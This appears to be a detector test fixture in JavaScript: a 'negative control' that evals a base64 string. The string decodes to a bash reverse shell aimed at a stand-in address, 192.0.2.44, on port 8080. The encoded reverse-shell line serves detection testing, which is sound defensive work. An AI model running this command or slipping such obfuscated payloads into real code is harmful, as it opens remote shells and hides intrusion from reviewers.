// Negative control: an encoded dev/tcp shell with no timer and no
// child_process execution, so the beacon loop is absent.
eval(Buffer.from("YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMC4yLjQ0LzgwODAgMD4mMSAyPiYxIg==", "base64").toString());
